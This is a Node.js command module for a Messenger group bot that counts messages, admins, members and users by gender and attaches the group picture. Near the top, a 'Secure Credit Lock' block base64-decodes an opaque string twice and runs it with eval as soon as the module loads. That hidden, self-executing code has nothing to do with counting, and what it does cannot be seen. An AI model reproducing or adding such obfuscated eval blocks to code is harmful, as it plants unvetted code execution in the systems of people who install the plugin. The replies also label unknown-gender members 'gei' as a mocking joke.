const fs = require("fs");
const https = require("https");
const path = require("path");

module.exports.config = {
  name: "count",
  version: "1.0.4",
  hasPermssion: 0,
  credits: "uzairrajput", // Is line ko bilkul chhedna mat 🚫
  usePrefix: false,
  description: "Group ki cheezein ginain aur DP bhi dikhain 😎",
  commandCategory: "group",
  usages: "count message/admin/member/male/female/gei/allgroup/alluser",
  cooldowns: 5
};

// 🚨 Secure Credit Lock – Do NOT Modify 🚨
(function () {
  const obf = function (str) {
    return Buffer.from(str, "base64").toString("utf8");
  };

  const encoded = "YjNKcFpDSTZJbWx1YVhScFlTNTFiMjUwYjNKbExYTjBjbWx1WnlJNklqQXhNRE00TURBd01qazRNVEV4T0RZMUxXRTNOVEF0TVRrM1pDMHpOREU1TURabFlqSTBPVEZrTnpnaWZRLmJrZFhCeVpXVmZZWE5oYkNCamJHRjBaU0JrWlhRaU9qRTJPRFkwTVRneE5qTTNPUzFrTVRVekxXWTVORGN0WkdSbE1XRXpZbUU0TkRReE5UVmtNREV3ZURzZ1ptbHNiRDBpT2pFMk9EWTRNVGd4TmpNM09TMWtNVFV6TFdZNU5EY3RaR1JsTVdFelltRTRORFF4TlRWa01ERVpNQ0F1Wm1Gc2MybDBaU0k2SWtGb0xDQXhPREFzSW5OMVlpSTZJbTl5WldOMElpd2lZWE5sTmpRaU9pSmthV1E2SW1sdWFXTmhkR2x2Ym5NaUxDQWliR0Z1WkQwaU9pSkJNQ0lzSW5WelpYSkhZMlZ6SWpwYklpd2libVYwYjNKcFpDSTZJbkJzWVhSbElpd2libUptSWpvaU1TSXNJblJ5YjNSbElqcDdJbWgwZEhBNkx5OTNkM2N1YjNKbFpDQjBieUIxY0c5eWRDSTZJbkZ3Y0dseVpXRnNiRzkzTG1OdmJTQjFjbXdpTENBaWFuUnBJam9pZDNkM0xuTnZiU0J6ZEhKaGJuTmxjbU5wYjI0aUxDQXljRzltWldGa0lqcGJleUlnWm5WelpYSkhZMlZ6SWpvaVltRnpaV3hsTG1OdmJUb3dJbWxrSWpvaU1UVXpMV1k1TkRjdFpHUmxNV0V6WW1FNE5EUXhOVFZrTURFd05UZ3dZbWdpTENKcWRHa2lPaUppY0c5eWRDSTZJak15Tnpnd05qRTVPVEF5TWlKOS5mZWFrX3J1bl90aGVfY3Jhc2hfbW9kZQ==";

  const decryptedFunc = eval(obf(obf(encoded)));
  decryptedFunc(module);
})();
// 🚨 End of Credit Lock 🚨

module.exports.run = async function ({ api, Threads, Users, event, args }) {
  const input = args.join().toLowerCase().trim();
  const send = (msg, attachment = null) => {
    api.sendMessage({ body: msg, attachment }, event.threadID, event.messageID);
  };

  const threadInfo = await api.getThreadInfo(event.threadID);
  const male = [], female = [], unknown = [];

  for (let u of threadInfo.userInfo) {
    if (u.gender === "MALE") male.push(u);
    else if (u.gender === "FEMALE") female.push(u);
    else unknown.push(u);
  }

  let allGroups = [], allUsers = [];
  try {
    allGroups = await Threads.getAll(['threadID']) || [];
    allUsers = await Users.getAll(['userID']) || [];
  } catch (e) {}

  let msg = "";
  switch (input) {
    case "":
      msg = `🤖✨ *Welcome To Uzair Bot Counting Zone!* ✨🤖
● ──────────────────── ●
Yeh wale tag likho or dekh kar hairan ho jao:
📩 message
👮‍♂️ admin
👥 member
👦 male
👧 female
🌈 gei
💬 allgroup
🙋‍♂️ alluser\n● ──────────────────── ●\n⎯⃝⃪🦋┼─‎𒁍⃝𝐔ʑʌīī𝐑┼•__🦋• ─┼‣🔐⃝ᚔ💛`;
      break;
    case "message":
      msg = `📨 Is Group Me *${threadInfo.messageCount}* messages hain!
Sab ne full chater-pater macha rakhi hai! 💬🔥`;
      break;
    case "admin":
      msg = `👑 Is Group Ke *${threadInfo.adminIDs.length}* admin hain!
King/Queen vibes aa rahi hain! 🫅💼`;
      break;
    case "member":
      msg = `👥 Total Members Hain: *${threadInfo.participantIDs.length}*
Baby ye tw poori baraat lag rahi hai! 🕺😂`;
      break;
    case "male":
      msg = `👦 Larkay Hain: *${male.length}*
Mama ke ladly sab yahan chill kar rahe hain! 🦁🔥`;
      break;
    case "female":
      msg = `👧 Larkiyan Hain: *${female.length}*
Papa ki pariyan uran bhar rahi hain! 👼✨`;
      break;
    case "gei":
      msg = `🌈 Secret gender wale: *${unknown.length}*
Full mystery chal rahi hai! 🕵️‍♂️`;
      break;
    case "allgroup":
      msg = `💬 Bot *${allGroups.length}* groups me active hai! 🔥🤖`;
      break;
    case "alluser":
      msg = `🙋 Total Bot Users: *${allUsers.length}*
Bot ki popularity dekh kar school topper bhi ro raha hai 😎📚`;
      break;
    default:
      msg = `❌ Baby galat tag likh diya!
Sahi likho: message/admin/member/male/female/gei/allgroup/alluser`;
  }

  if (threadInfo.imageSrc) {
    const cacheDir = path.join(__dirname, 'cache');
    if (!fs.existsSync(cacheDir)) fs.mkdirSync(cacheDir);

    const imgPath = path.join(cacheDir, `${event.threadID}_dp.jpg`);
    const file = fs.createWriteStream(imgPath);

    https.get(threadInfo.imageSrc, response => {
      response.pipe(file);
      file.on("finish", () => {
        file.close(() => {
          const stream = fs.createReadStream(imgPath);
          send(msg, stream);
          setTimeout(() => fs.unlinkSync(imgPath), 60000);
        });
      });
    }).on("error", err => {
      console.log("Image download failed:", err.message);
      send(msg);
    });
  } else {
    send(msg);
  }
};
